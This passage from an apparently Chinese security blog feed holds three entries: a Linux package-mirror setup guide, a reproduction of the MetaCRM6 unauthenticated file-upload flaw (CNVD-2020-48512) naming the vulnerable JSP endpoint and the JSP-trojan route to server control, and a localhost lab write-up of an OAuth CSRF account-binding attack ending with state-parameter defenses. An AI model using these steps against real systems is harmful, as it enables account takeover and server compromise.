<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo gedit /etc/apt/sources.list</span><br></pre></td></tr></table></figure></li>
<li><p>修改<code>sources.list</code>文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#  阿里镜像源</span></span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse</span><br><span class="line"></span><br><span class="line"><span class="comment">#  中科大镜像源</span></span><br><span class="line">deb https://mirrors.ustc.edu.cn/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line">deb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line">deb https://mirrors.ustc.edu.cn/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb https://mirrors.ustc.edu.cn/ubuntu/ bionic-backports main restricted universe multiverse</span><br><span class="line">deb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic-backports main restricted universe multiverse</span><br><span class="line">deb https://mirrors.ustc.edu.cn/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line">deb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line">deb https://mirrors.ustc.edu.cn/ubuntu/ bionic-proposed main restricted universe multiverse</span><br><span class="line">deb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic-proposed main restricted universe multiverse</span><br><span class="line"></span><br><span class="line"><span class="comment"># 清华镜像源</span></span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line">deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-backports main restricted universe multiverse</span><br><span class="line">deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-backports main restricted universe multiverse</span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line">deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-proposed main restricted universe multiverse</span><br><span class="line">deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-proposed main restricted universe multiverse</span><br><span class="line"></span><br><span class="line"><span class="comment"># 163镜像源</span></span><br><span class="line">deb http://mirrors.163.com/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line">deb http://mirrors.163.com/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line">deb http://mirrors.163.com/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb http://mirrors.163.com/ubuntu/ bionic-proposed main restricted universe multiverse</span><br><span class="line">deb http://mirrors.163.com/ubuntu/ bionic-backports main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.163.com/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.163.com/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.163.com/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.163.com/ubuntu/ bionic-proposed main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.163.com/ubuntu/ bionic-backports main restricted universe multiverse</span><br></pre></td></tr></table></figure></li>
<li><p>更新源</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br></pre></td></tr></table></figure></li>
<li><p>查看可更新软件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt list --upgradable</span><br></pre></td></tr></table></figure></li>
<li><p>进行更新操作</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt upgrade</span><br></pre></td></tr></table></figure></li>
<li><p>清除不需要的旧组件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt autoremove</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="CentOS"><a href="#CentOS" class="headerlink" title="CentOS"></a>CentOS</h1><ol>
<li><p>备份/删除旧的镜像源</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mv</span> /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.backup</span><br></pre></td></tr></table></figure></li>
<li><p>下载新的镜像源</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-5.repo</span><br></pre></td></tr></table></figure>

<p>不同镜像源的下载网址如下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 阿里云镜像源</span></span><br><span class="line">http://mirrors.aliyun.com/repo/Centos-6.repo</span><br><span class="line">http://mirrors.aliyun.com/repo/Centos-7.repo</span><br><span class="line">http://mirrors.aliyun.com/repo/Centos-8.repo</span><br><span class="line"></span><br><span class="line"><span class="comment"># 网易镜像源</span></span><br><span class="line">http://mirrors.163.com/.help/repo/Centos-6.repo</span><br><span class="line">http://mirrors.163.com/.help/repo/Centos-7.repo</span><br><span class="line">http://mirrors.163.com/.help/repo/Centos-8.repo</span><br></pre></td></tr></table></figure>

<p>更换清华的镜像源需要直接编辑<code>/etc/yum.repos.d/CentOS-Base.repo</code>文件，编辑内容<a href="https://mirror.tuna.tsinghua.edu.cn/help/centos/">点击参考</a></p>
</li>
<li><p>更新镜像源</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#清除缓存</span></span><br><span class="line">yum clean all  </span><br><span class="line"><span class="comment">#生成缓存</span></span><br><span class="line">yum makecache</span><br><span class="line"><span class="comment">#更新包</span></span><br><span class="line">yum update</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="Kali"><a href="#Kali" class="headerlink" title="Kali"></a>Kali</h1><ol>
<li><p>命令行打开<code>sources.list</code>文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/apt/sources.list</span><br></pre></td></tr></table></figure></li>
<li><p>修改<code>sources.list</code>文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 阿里云镜像源</span></span><br><span class="line">deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line"></span><br><span class="line"><span class="comment"># 清华镜像源</span></span><br><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line"></span><br><span class="line"><span class="comment"># 中科大镜像源</span></span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali-security kali-current/updates main contrib non-free</span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali-security kali-current/updates main contrib non-free</span><br><span class="line"></span><br><span class="line"><span class="comment"># kali官方镜像源</span></span><br><span class="line">deb http://http.kali.org/kali kali-rolling main non-free contrib </span><br><span class="line">deb-src http://http.kali.org/kali kali-rolling main non-free contrib </span><br><span class="line"></span><br><span class="line"><span class="comment"># 默认，注释即可</span></span><br><span class="line"><span class="comment"># deb http://security.kali.org/kali-security kali-rolling/updates main contrib non-free</span></span><br><span class="line"><span class="comment"># deb-src http://security.kali.org/kali-security kali-rolling/updates main contrib non-free</span></span><br></pre></td></tr></table></figure></li>
<li><p>更新源</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br></pre></td></tr></table></figure></li>
<li><p>查看可更新软件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt list --upgradable</span><br></pre></td></tr></table></figure></li>
<li><p>进行更新操作</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt upgrade</span><br></pre></td></tr></table></figure></li>
<li><p>清除不需要的旧组件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt autoremove</span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>Linux技巧</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>镜像</tag>
      </tags>
  </entry>
  <entry>
    <title>MetaCRM6文件上传漏洞</title>
    <url>/MetaCRM6%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.html</url>
    <content><![CDATA[<h2 id="【CNVD-2020-48512】MetaCRM6文件上传漏洞"><a href="#【CNVD-2020-48512】MetaCRM6文件上传漏洞" class="headerlink" title="【CNVD-2020-48512】MetaCRM6文件上传漏洞"></a>【CNVD-2020-48512】MetaCRM6文件上传漏洞</h2><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>北京美特软件技术有限公司MetaCRM6客户关系管理系统存在文件上传漏洞，攻击者可利用漏洞获取服务器控制权。</p>
<span id="more"></span>

<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>MetaCRM6</p>
<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><ol>
<li><p>判断是否能够访问URL：<code>/develop/systparam/softlogo/file2.jsp</code>，该URL存在文件上传，不用登录。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20220912232046.png"></p>
</li>
<li><p>上测试文件test.jsp，通过BURP抓包可以获取文件上传路径。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20220912232219.png"></p>
</li>
<li><p>URL可正常访问该文件</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20220912232126.png"></p>
</li>
<li><p>如果上传JSP木马，即可被解析完成提权。</p>
</li>
</ol>
<p><strong>注：仅当作技术研究，请勿用于非法用途 后果作者概不负责！！！</strong></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞 MetaCRM</tag>
      </tags>
  </entry>
  <entry>
    <title>OAuth CSRF实验</title>
    <url>/OAuth-CSRF%E5%AE%9E%E9%AA%8C.html</url>
    <content><![CDATA[<h1 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h1><ol>
<li>通过一个简单的OAuth CSRF攻击实验，来熟悉OAuth的协议流程；</li>
<li>通过攻击实验来理解OAuth协议的安全性；</li>
</ol>
<span id="more"></span>

<h1 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h1><ul>
<li>IDE：IntelliJ IDEA 2019.3 x64</li>
<li>JDK：1.8</li>
<li>OS：Windows 10 x64</li>
<li>数据库：mysql-5.6.46.0-winx64</li>
<li>服务器：apache-tomcat-8.5.45</li>
<li>IdP服务器地址：<a href="http://localhost:8080/">http://localhost:8080</a></li>
<li>RP服务器地址：<a href="http://localhost:8081/">http://localhost:8081</a></li>
<li>Attack服务器地址：<a href="http://localhost:8081/">http://localhost:8082</a></li>
</ul>
<h1 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h1><p>通过OAuth CSRF攻击实验，达到如下效果：攻击者通过诱导用户点击恶意链接，使得用户的账号通过OAuth协议与攻击的IdP账号绑定在一起，从而可以使得攻击者用自己的IdP账号通过OAuth登录到用户的账号。  具体步骤如下：</p>
<ol>
<li>攻击者登录到RP，并且选择绑定自己的IdP账号；</li>
<li>RP将攻击者重定向到IdP，攻击者登录IdP，IdP向他显示是否授权RP访问的页面；</li>
<li>攻击者在点击”同意授权”之后，截获IdP服务器返回的含有Authorization code参数的HTTP响应;</li>
<li>攻击者精心构造一个Web页面，它会触发向IdP发起令牌申请的请求，而这个请求中的Authorization Code参数正是上一步截获到的code；</li>
<li>攻击者将这个Web页面放到互联网上，等待或者诱骗受害者来访问；</li>
<li>受害者之前登录了RP网站，只是没有把自己的账号和其他社交账号绑定起来。在受害者访问了攻击者准备的这个Web页面，令牌申请流程在受害者的浏览器里被顺利触发，RP从IdP那里获取到access_token，但是这个token以及通过它进一步获取到的用户信息却都是攻击者的；</li>
<li>RP将攻击者的IdP账号同受害者的RP账号关联绑定起来；</li>
<li>从此以后，攻击者就可以用自己的IdP账号通过OAuth登录到受害者在RP中的账号，冒充受害者的身份执行各种操作。</li>
</ol>
<p>   具体的攻击流程图如下图所示：</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191205103141.jpg">备注：第9步中，攻击者应该获取到当前登录状态下用户的cookie，并且将cookie写入请求头中，RP会检查cookie来判断用户是否是登录状态，从而判断是否同意进行绑定请求，但目前从实现上来讲，获取cookie，并检查cookie较为困难，因此在实际实现中，cookie只是已简单的参数形式，传给RP，RP也不检查cookie；</p>
<h1 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h1><p>环境配置没有按照实验要求，使用的是自己之前配置完成的JDK+Mysql+Apache环境，相关参数上述已经说明，但是由于环境和程序源代码出现冲突，做了一些改变，配置步骤不再赘述；</p>
<h2 id="数据库创建"><a href="#数据库创建" class="headerlink" title="数据库创建"></a>数据库创建</h2><h3 id="RP数据库"><a href="#RP数据库" class="headerlink" title="RP数据库"></a>RP数据库</h3><ol>
<li><p>建立名为<code>RP</code>的数据库；</p>
</li>
<li><p>并且建立<code>user</code>数据表，其字段为：</p>
<ul>
<li>id：编号</li>
<li>userename：RP用户名</li>
<li>password：RP密码</li>
<li>idp：身份认证提供商</li>
</ul>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191205132234.png"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191205131553.png"></p>
</li>
</ol>
<h3 id="IdP数据库"><a href="#IdP数据库" class="headerlink" title="IdP数据库"></a>IdP数据库</h3><ol>
<li><p>建立名为<code>shiro</code>的数据库；</p>
</li>
<li><p>建立<code>oauth2_client</code>数据表，其字段为：</p>
<ul>
<li>id：编号</li>
<li>client_name：第三方应用名称</li>
<li>client_id：第三方应用id</li>
<li>client_secret：第三方应用密钥</li>
</ul>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191205131058.png"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191205131553.png"></p>
</li>
<li><p>建立oauth2_user表，其字段为：</p>
<ul>
<li>id：编号</li>
<li>username：IdP用户名</li>
<li>password：IdP密码</li>
<li>salt：盐</li>
</ul>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191205133229.png"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191205131553.png"></p>
</li>
</ol>
<h3 id="检查RP数据库配置"><a href="#检查RP数据库配置" class="headerlink" title="检查RP数据库配置"></a>检查RP数据库配置</h3><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191212000948.png"></p>
<p>程序中数据库配置正确；</p>
   <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String driver=<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String url=<span class="string">&quot;jdbc:mysql://localhost:3306/rp?characterEncoding=utf8&amp;useSSL=true&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String username=<span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String password=<span class="string">&quot;123456&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Connection con=<span class="literal">null</span>;</span><br></pre></td></tr></table></figure>

<h3 id="检查IdP数据库配置"><a href="#检查IdP数据库配置" class="headerlink" title="检查IdP数据库配置"></a>检查IdP数据库配置</h3><p>   <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191212001103.png"></p>
<p>程序中数据库配置正确；</p>
   <figure class="highlight java"><table><tr><td class="code"><pre><span class="line">#dataSource configure</span><br><span class="line">connection.url=jdbc:mysql:<span class="comment">//localhost:3306/shiro</span></span><br><span class="line">connection.username=root</span><br><span class="line">connection.password=toor</span><br></pre></td></tr></table></figure>

<h2 id="服务器启动"><a href="#服务器启动" class="headerlink" title="服务器启动"></a>服务器启动</h2><h3 id="启动IdP服务器"><a href="#启动IdP服务器" class="headerlink" title="启动IdP服务器"></a>启动IdP服务器</h3><p>双击<code>jetty:run</code>，启动服务器；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191206171558.png"></p>
<p>运行显示如下图，表示IdP服务器启动成功；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191210164537.png"></p>
<h3 id="启动RP服务器"><a href="#启动RP服务器" class="headerlink" title="启动RP服务器"></a>启动RP服务器</h3><p>将点击 Edit Configurations，修改RP配置如下；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191210164752.png"></p>
<p>将application context置为空；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191206172513.png"></p>
<p>启动RP服务器，运行显示如下图，表示RP服务器启动成功；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191210164925.png"></p>
<h2 id="实验流程"><a href="#实验流程" class="headerlink" title="实验流程"></a>实验流程</h2><h3 id="注册RP，获得ClientID和Secret"><a href="#注册RP，获得ClientID和Secret" class="headerlink" title="注册RP，获得ClientID和Secret"></a>注册RP，获得ClientID和Secret</h3><ol>
<li><p>打开IdP网址<a href="http://localhost:8080/zetark-oauth2-server/client%E8%BF%9B%E8%A1%8C%E7%AC%AC%E4%B8%89%E6%96%B9%E5%BA%94%E7%94%A8(RP)%E6%B3%A8%E5%86%8C%EF%BC%9B">http://localhost:8080/zetark-oauth2-server/client进行第三方应用(RP)注册；</a></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191210165024.png"></p>
</li>
<li><p>点击应用新增，输入第三方应用RP的名称<code>testApp</code>；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191212000208.png"></p>
<p>由于未将id设置为自动递增，报错如下：</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191210110527.png"></p>
<p>更改数据库配置，将id设置为自动递增；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191210110847.png"></p>
<p>再次点击新增应用，注册完毕获得客户端ID(client_id)<code>88f55e00-5f78-44e1-abfb-fa6c5368366d</code>和客户端安全KEY(clinet_secret)<code>788639e3-8355-4fa8-aa38-ae04670ac30b</code>，RP需要记录这两个参数，用于后续的OAuth认证，即需要在源代码中一些位置更改上述的两个参数，这里只举例一处；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191211233406.png"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191212004236.png"></p>
</li>
</ol>
<h3 id="攻击者：注册IdP账号"><a href="#攻击者：注册IdP账号" class="headerlink" title="攻击者：注册IdP账号"></a>攻击者：注册IdP账号</h3><ol>
<li><p>打开IdP网址<a href="http://localhost:8080/zetark-oauth2-server/user%E8%BF%9B%E8%A1%8C%E8%B4%A6%E5%8F%B7%E6%B3%A8%E5%86%8C%EF%BC%8C%E8%AF%A5%E8%B4%A6%E5%8F%B7%E5%B0%86%E7%94%A8%E4%BA%8E%E7%BB%91%E5%AE%9ARP%E8%B4%A6%E5%8F%B7%EF%BC%9B">http://localhost:8080/zetark-oauth2-server/user进行账号注册，该账号将用于绑定RP账号；</a></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191210165401.png"></p>
</li>
<li><p>点击用户新增，注册用户<code>attack</code>；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191210165635.png"></p>
</li>
<li><p>注册成功后，显示用户；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191210165722.png"></p>
</li>
</ol>
<h3 id="用户注册RP账号"><a href="#用户注册RP账号" class="headerlink" title="用户注册RP账号"></a>用户注册RP账号</h3><ol>
<li><p>打开RP网站<a href="http://localhost:8081/%E8%BF%9B%E8%A1%8C%E8%B4%A6%E5%8F%B7%E6%B3%A8%E5%86%8C%EF%BC%9B">http://localhost:8081/进行账号注册；</a></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191210165947.png"></p>
</li>
<li><p>到注册页面，设置用户名为<code>Leeyuxun</code>，点击注册；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191210170327.png"></p>
</li>
<li><p>注册成功后，返回登录页面，进行登录；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191210170204.png"></p>
</li>
<li><p>调试窗口显示登录成功；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191212005954.png"></p>
</li>
<li><p>网页显示登陆成功；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191210180148.png"></p>
</li>
</ol>
<h3 id="攻击者完成攻击前的状态"><a href="#攻击者完成攻击前的状态" class="headerlink" title="攻击者完成攻击前的状态"></a>攻击者完成攻击前的状态</h3><ol>
<li><p>在IdP账号没有绑定RP账号<code>testApp</code>的情况下，用IdP账号<code>attacker</code>来登录RP网站，点击使用IdP授权，发现IdP显示，应用<code>testApp</code>正在请求接入；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191211235615.png"></p>
</li>
<li><p>输入IdP账号，用户名<code>attack</code>，点击登录并授权，验证通过后会显示该用户未绑定。实际上<code>attack</code>用户只是IdP用户，并没有绑定过RP用户，因此无法用IdP的账号来登录RP网站；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191210234832.png"></p>
</li>
</ol>
<h3 id="攻击者的操作流程"><a href="#攻击者的操作流程" class="headerlink" title="攻击者的操作流程"></a>攻击者的操作流程</h3><ol>
<li><p>下面进行CSRF攻击，首先让用户<code>Leeyuxun</code>登录到RP网站；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191210235710.png"></p>
</li>
<li><p>攻击者在用户<code>Leeyuxun</code>保持登录状态时，打开绑定用户的链接<a href="http://localhost:8080/zetark-oauth2-server/authorize?client_id=88f55e00-5f78-44e1-abfb-fa6c5368366d&amp;response_type=code&amp;redirect_uri=http://localhost:8081/accesstoken.jsp&amp;scope=bindlogin">http://localhost:8080/zetark-oauth2-server/authorize?client_id=88f55e00-5f78-44e1-abfb-fa6c5368366d&amp;response_type=code&amp;redirect_uri=http://localhost:8081/accesstoken.jsp&amp;scope=bindlogin</a></p>
</li>
<li><p>输入攻击者<code>attack</code>在IdP上的账号，点击登录并授权；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191211235504.png"></p>
</li>
<li><p>验证通过后，获得返回的授权码code，位于url地址中，为<code>38575af7f999713cffce720e74409ad6</code>；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191211234803.png"></p>
</li>
<li><p>将code放入事先写好的攻击项目中，并build运行<code>attcak</code>项目；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191212001438.png"></p>
</li>
</ol>
<h3 id="用户登录RP并访问攻击者的网站"><a href="#用户登录RP并访问攻击者的网站" class="headerlink" title="用户登录RP并访问攻击者的网站"></a>用户登录RP并访问攻击者的网站</h3><ol>
<li><p>等待用户访问攻击者的网站，点击恶意链接<a href="http://localhost:8082/attack%EF%BC%8C%E6%94%BB%E5%87%BB%E8%80%85%E4%BC%AA%E9%80%A0%E4%B8%80%E4%B8%AApost%E8%AF%B7%E6%B1%82%EF%BC%8C%E5%8F%91%E9%80%81%E7%BB%99RP%E7%BD%91%E7%AB%99http://localhost:8081/binding_request%EF%BC%8C%E5%85%B6%E4%B8%ADpost%E8%AF%B7%E6%B1%82%E5%90%AB%E6%9C%89%EF%BC%9A%E6%8E%88%E6%9D%83%E7%A0%81code%EF%BC%8C%E5%8F%97%E5%AE%B3%E8%80%85RP%E7%9A%84%E7%94%A8%E6%88%B7%E5%90%8Drp_user_name%EF%BC%9B">http://localhost:8082/attack，攻击者伪造一个post请求，发送给RP网站http://localhost:8081/binding_request，其中post请求含有：授权码code，受害者RP的用户名rp_user_name；</a></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191211105853.png"></p>
</li>
<li><p>当用户点击恶意链接时，当前RP用户就会与攻击者的IdP账号绑定，完成CSRF攻击；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191211105825.png"></p>
</li>
</ol>
<h3 id="攻击者入侵用户的RP账户"><a href="#攻击者入侵用户的RP账户" class="headerlink" title="攻击者入侵用户的RP账户"></a>攻击者入侵用户的RP账户</h3><ol>
<li><p>攻击者用攻击者的IdP账号成功登录用户的RP账号；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191211235504.png"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191211235408.png"></p>
</li>
</ol>
<h1 id="实验结论"><a href="#实验结论" class="headerlink" title="实验结论"></a>实验结论</h1><p>由于OAuth2的认证流程是分为好几步来完成的，当第三方应用在收到一个GET请求时，除了能知道当前用户的cookie，以及URL中的Authorization Code之外，难以分辨出这个请求到底是用户本人的意愿，还是攻击者利用用户的身份伪造出来的请求。因此，攻击者可使用移花接木的手段，提前准备一个含有自己的Authorization Code请求，并让受害者的浏览器来接着完成后续的令牌申请流程；</p>
<h2 id="攻击者攻击前提条件"><a href="#攻击者攻击前提条件" class="headerlink" title="攻击者攻击前提条件"></a>攻击者攻击前提条件</h2><ol>
<li>在攻击过程中，受害者在RP上的用户会话(User Session)必须是有效的，即受害者在受到攻击前已经登录了RP；</li>
<li>整个攻击必须在短时间内完成，因为OAuth2提供者颁发的Authorization Code有效期很短，OAuth2官方推荐的时间是不大于10分钟，而一旦Authorization Code过期那么后续的攻击也就不能进行下去了；</li>
<li>一个Authorization Code只能被使用一次，如果OAuth2提供者收到重复的Authorization Code，它会拒绝当前的令牌申请请求。不止如此，根据OAuth2官方推荐，它还可以把和这个已经使用过的Authorization Code相关联的access_token全部撤销掉，进一步降低安全风险；</li>
</ol>
<h2 id="预防方法"><a href="#预防方法" class="headerlink" title="预防方法"></a>预防方法</h2><p>要防止这样的攻击其实很容易，作为第三方应用的开发者，只需在OAuth2认证过程中加入state参数，并验证它的参数值即可。具体细节如下：</p>
<p>在将用户重定向到OAuth2的Authorization Endpoint去的时候，为用户生成一个随机的字符串，并作为state参数加入到URL中。在收到OAuth2服务提供者返回的Authorization Code请求的时候，验证接收到的state参数值。如果是正确合法的请求，那么此时接受到的参数值应该和上一步提到的为该用户生成的state参数值完全一致，否则就是异常请求。state参数值需要具备下面几个特性：</p>
<ol>
<li><strong>不可预测性</strong>：足够的随机，使得攻击者难以猜到正确的参数值</li>
<li><strong>关联性</strong>：state参数值和当前用户会话（user session）是相互关联的</li>
<li><strong>唯一性</strong>：每个用户，甚至每次请求生成的state参数值都是唯一的</li>
<li><strong>时效性</strong>：state参数一旦被使用则立即失效</li>
</ol>
]]></content>
      <categories>
        <category>大数据安全实验</category>
      </categories>
      <tags>
        <tag>CSRF</tag>
        <tag>OAuth</tag>
      </tags>
  </entry>
  <entry>
    <title>ROPgadget介绍</title>
    <url>/ROPgadget%E4%BB%8B%E7%BB%8D.html</url>
